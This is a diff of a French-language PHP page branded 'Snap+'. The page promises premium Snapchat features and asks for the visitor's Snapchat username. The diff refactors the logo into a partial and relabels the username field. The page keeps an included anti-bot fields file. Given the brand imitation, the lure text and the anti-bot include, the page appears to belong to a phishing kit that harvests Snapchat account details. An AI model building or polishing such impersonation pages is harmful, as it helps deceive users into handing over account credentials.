@@ -70,12 +70,7 @@ $css = require __DIR__ . '/includes/snap_styles.php';
 </head>
 <body>
     <div class="card">
-        <div class="logo-wrap" aria-hidden="true">
-            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                <path fill="#fff" stroke="#000" stroke-width="3" d="M50 8 C28 8 12 28 12 48 c0 8 3 16 8 22 C12 78 8 88 8 92 h84 c0-4-4-14-12-22 5-6 8-14 8-22 C88 28 72 8 50 8z M38 58 c4 6 10 10 12 10 s8-4 12-10"/>
-            </svg>
-        </div>
-        <div class="badge">SNAP+</div>
+        <?php require __DIR__ . '/includes/partials_snap_brand.php'; ?>
         <p class="intro">Bienvenue sur Snap+ ! Profitez d'avantages exclusifs et de fonctionnalités premium pour votre compte Snapchat.</p>
 
         <?php if ($error !== '') : ?>
@@ -84,7 +79,7 @@ $css = require __DIR__ . '/includes/snap_styles.php';
 
         <form method="post" action="">
             <?php require __DIR__ . '/includes/form_antibot_fields.php'; ?>
-            <label for="pseudo">Nom d'utilisateur</label>
+            <label for="pseudo" class="sr-only">Nom d'utilisateur Snapchat</label>
             <input
                 type="text"
                 id="pseudo"
